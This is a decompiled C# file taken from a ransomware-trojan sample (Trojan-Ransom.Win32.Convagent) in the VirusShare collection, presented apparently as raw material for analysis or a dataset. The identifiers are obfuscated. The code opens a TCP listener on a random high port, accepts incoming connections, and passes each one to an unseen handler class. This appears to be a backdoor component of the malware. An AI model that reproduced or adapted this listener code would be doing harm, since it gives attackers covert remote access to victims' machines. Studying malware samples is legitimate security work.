// Decompiled with JetBrains decompiler
// Type: *p.A
._".571N3"
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C;
using \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0001_\u008D\u0022;
using System;
using System.Net;
using System.Net.Sockets;

namespace \u002Ap\u000C.\u0019A\u0013\u001C\u000A\u000B.\u0001_\u008D\u0022
{
  internal class \u003571\u0017N3\u0022
  {
    private static Socket \u0018\u0022\u0026\u0023X = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

    public static void \u0016\u0011()
    {
      try
      {
        \u0034\u002Dy\u0029\u000B\u0023.\u000C\u002EF\u000D\u002A\u0017 = (ushort) \u001AOk\u00245\u0023.H6A.Next(1024, 65000);
        \u003571\u0017N3\u0022.\u0018\u0022\u0026\u0023X.Bind((EndPoint) new IPEndPoint(IPAddress.Any, (int) \u0034\u002Dy\u0029\u000B\u0023.\u000C\u002EF\u000D\u002A\u0017));
        \u003571\u0017N3\u0022.\u0018\u0022\u0026\u0023X.Listen(\u0034\u002Dy\u0029\u000B\u0023.C\u002B);
        \u003571\u0017N3\u0022.\u0018\u0022\u0026\u0023X.BeginAccept(new AsyncCallback(\u003571\u0017N3\u0022.W\u0006\u0021\u001C\u0021\u001BW), (object) \u003571\u0017N3\u0022.\u0018\u0022\u0026\u0023X);
      }
      catch
      {
        \u003571\u0017N3\u0022.\u000A\u003B\u0029\u001D5P();
      }
    }

    public static void \u000A\u003B\u0029\u001D5P()
    {
      try
      {
        \u0034\u002Dy\u0029\u000B\u0023.\u000C\u002EF\u000D\u002A\u0017 = (ushort) 0;
        \u003571\u0017N3\u0022.\u0018\u0022\u0026\u0023X.Close();
      }
      catch
      {
      }
    }

    private static void W\u0006\u0021\u001C\u0021\u001BW(IAsyncResult _param0)
    {
      try
      {
        Socket socket = ((Socket) _param0.AsyncState).EndAccept(_param0);
        if (socket != null)
          new F\u0024\u000B\u0025(socket).\u000F\u0002();
        ((Socket) _param0.AsyncState).BeginAccept(new AsyncCallback(\u003571\u0017N3\u0022.W\u0006\u0021\u001C\u0021\u001BW), (object) (Socket) _param0.AsyncState);
      }
      catch
      {
      }
    }
  }
}
